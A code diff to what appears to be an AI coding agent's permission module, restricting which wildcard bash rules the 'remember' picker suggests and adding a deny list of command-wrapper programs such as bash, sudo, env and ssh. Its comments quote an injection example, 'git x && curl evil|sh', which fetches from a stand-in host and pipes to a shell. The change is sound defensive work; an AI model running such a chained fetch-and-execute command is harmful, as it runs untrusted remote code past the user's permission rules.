@@ -441,6 +441,36 @@ def _restart_resolution_marker(store, request: dict, *, allow: bool) -> bool:
         return False
 
 
+#: A shell word a prefix rule may be built from: no quote, glob or expansion.
+_PLAIN_WORD = re.compile(r"^[A-Za-z0-9_./+:@%,=-]+$")
+#: Programs whose arguments are themselves a command: a prefix rule on them
+#: ('bash -c *', 'env *') would authorize anything at all.
+_COMMAND_WRAPPERS = frozenset(
+    {
+        "sh",
+        "bash",
+        "zsh",
+        "dash",
+        "ksh",
+        "fish",
+        "env",
+        "sudo",
+        "doas",
+        "su",
+        "eval",
+        "exec",
+        "xargs",
+        "nohup",
+        "time",
+        "timeout",
+        "nice",
+        "command",
+        "builtin",
+        "ssh",
+    }
+)
+
+
 def suggest_patterns(method: str, target: str) -> list[str]:
     """Offer a few generalizations of a tool target for the 'remember' picker,
     most-specific first (opencode's biggest UX win over storing exact strings)."""
@@ -449,16 +479,26 @@ def suggest_patterns(method: str, target: str) -> list[str]:
     if target:
         out.append(target)
     if method == "bash" and target:
-        # A '*' in a bash rule spans shell metacharacters, so a broad prefix rule
-        # like 'git *' would also authorize 'git x && curl evil|sh'. Only offer
-        # prefix generalizations for a SINGLE simple command (no ; && || | ` $()
-        # redirects); for a compound command offer just the exact string.
-        if not re.search(r"[;&|`]|\$\(|>|<", target):
-            toks = target.split()
-            if len(toks) >= 2:
+        # A prefix rule ('python3 -c *', 'which *') is what makes "remember"
+        # worth anything: the exact command string never comes back. The rule
+        # matcher lets a wildcard bash rule cover only a single simple command
+        # (`_rule_widens_compound_bash`), so 'git *' never authorizes
+        # 'git x && curl evil|sh'. Prefixes are offered only for a simple
+        # command (quote-aware: the ';' in python3 -c "a; b" is quoted), only
+        # from plain words, and never for a program that runs another command
+        # (bash -c, env, sudo, xargs …), where the prefix would be everything.
+        from openai4s.storage.permissions import bash_command_is_simple
+
+        toks = target.split()
+        if (
+            bash_command_is_simple(target)
+            and toks
+            and _PLAIN_WORD.match(toks[0])
+            and os.path.basename(toks[0]) not in _COMMAND_WRAPPERS
+        ):
+            if len(toks) >= 2 and _PLAIN_WORD.match(toks[1]):
                 out.append(f"{toks[0]} {toks[1]} *")
-            if toks:
-                out.append(f"{toks[0]} *")
+            out.append(f"{toks[0]} *")
     elif method in ("write_file", "edit_file", "read_file", "save_artifact") and target:
         # dir/* and *.ext generalizations
         if "/" in target:
